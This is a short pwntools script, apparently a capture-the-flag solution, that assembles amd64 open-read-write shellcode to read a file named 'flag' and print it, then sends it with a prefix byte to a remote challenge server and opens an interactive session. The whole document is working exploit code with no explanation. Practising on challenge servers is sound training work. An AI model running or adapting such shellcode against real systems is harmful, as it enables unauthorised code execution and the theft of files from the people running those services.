from pwn import *

context.arch = 'amd64'
shellcode = '''
push 0x67616c66
mov rdi,rsp
mov rax, 2
xor rsi,rsi
mov rdx,80
syscall
mov rdi,rax
mov rsi,rsp
xor rax,rax
syscall
mov rdi, 1
mov rax, 1
syscall
'''
r = remote("node3.buuoj.cn", 26827)
r.sendline('\x3C' + '\x00' + asm(shellcode, arch='amd64', os='linux'))
r.interactive()
